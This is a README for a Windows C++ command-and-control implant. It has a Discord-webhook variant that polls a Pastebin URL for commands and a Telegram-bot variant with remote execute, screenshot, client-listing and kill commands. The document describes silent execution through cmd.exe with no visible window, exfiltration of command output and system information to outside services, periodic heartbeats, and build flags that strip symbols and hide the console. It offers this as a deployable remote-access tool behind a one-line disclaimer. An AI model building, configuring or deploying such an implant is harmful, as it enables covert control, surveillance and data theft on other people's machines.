# Command and Control Implementation

This program provides two different implementations for command and control:

1. **Discord Webhook Version**: Periodically fetches commands from a specified Pastebin URL, executes them silently on the host machine, and sends the command and its output to a specified Discord webhook.

2. **Telegram Bot Version**: Connects to a Telegram bot, listens for commands from an authorized chat, executes them silently on the host machine, and sends the output back to the Telegram chat.

## Features

### Discord Webhook Version

*   Fetches command from `https://pastebin.com/raw/KGNHeZd8` every 10 seconds.
*   Executes the fetched command using `cmd.exe` via CreateProcess.
*   Sends the executed command and its output (max ~1800 chars) to the Discord webhook.
*   Sends a notification to the webhook when the program starts.
*   Runs silently with no visible console window.

### Telegram Bot Version

*   Connects to the Telegram Bot API using a bot token.
*   Listens for messages from an authorized chat ID.
*   Executes commands received from Telegram using `cmd.exe` via CreateProcess.
*   Sends command output back to the Telegram chat.
*   Sends system information on startup.
*   Runs silently with no visible console window.
*   Provides command-based management for multiple connected clients.
*   Sends periodic heartbeats to maintain presence information.

#### Telegram Bot Commands

The Telegram bot implementation supports the following commands:

* `/help` - Display a list of available commands
* `/list` - List all connected clients
* `/info [client_id]` - Get system information for a specific client or the current client
* `/execute [client_id] <command>` - Execute a command on a specific client or the current client
* `/screenshot [client_id]` - Take a screenshot on a specific client or the current client
* `/kill [client_id]` - Terminate a specific client or the current client
* `/status` - Show current status and uptime information

Examples:

```
/list
/info
/info PC123_Admin_20230515123045
/execute ipconfig /all
/execute PC123_Admin_20230515123045 systeminfo
/screenshot
/kill PC123_Admin_20230515123045
```

## Configuration

### Discord Webhook Version

Edit the following constants in `re_webhook.cpp`:
```cpp
const std::string WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL";
const std::string COMMAND_URL = "YOUR_PASTEBIN_RAW_URL";
```

### Telegram Bot Version

Edit the following constants in `re_webhook.cpp`:
```cpp
const std::string TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
const std::string TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";
```

To create a Telegram bot and get a token:
1. Talk to [@BotFather](https://t.me/botfather) on Telegram
2. Use the `/newbot` command and follow the instructions
3. Copy the API token that BotFather gives you

To get your chat ID:
1. Start a conversation with your bot
2. Visit `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
3. Look for the `"chat":{"id":XXXXXXXXX}` value in the response

## Compilation

Requires MinGW (specifically `i686-w64-mingw32-g++` or similar).

Use the provided Makefile:

For Discord Webhook version:
```bash
make webhook
```

For Telegram Bot version:
```bash
make telegram
```

Or compile directly:

Discord Webhook version:
```bash
i686-w64-mingw32-g++ re_webhook.cpp -o WebhookCommandExecutor.exe -lwininet -s -O2 -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -static -lpthread -mwindows
```

Telegram Bot version:
```bash
i686-w64-mingw32-g++ re_webhook.cpp -o TelegramBotC2.exe -lwininet -s -O2 -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -static -lpthread -mwindows
```

The `-mwindows` flag prevents the console window from appearing.

## Client Features

Each connected client reports the following information:

1. **Unique Client ID**: Generated from hostname, username, and timestamp
2. **System Information**: OS details, CPU, RAM, IP addresses
3. **Heartbeats**: Regular check-ins every 5 minutes
4. **Command Execution**: Remote command execution with output capture
5. **Process Control**: Ability to terminate the client remotely

## Security Warning

This program executes arbitrary commands received from either Discord webhook or Telegram. Use responsibly and ensure proper authorization mechanisms are in place.

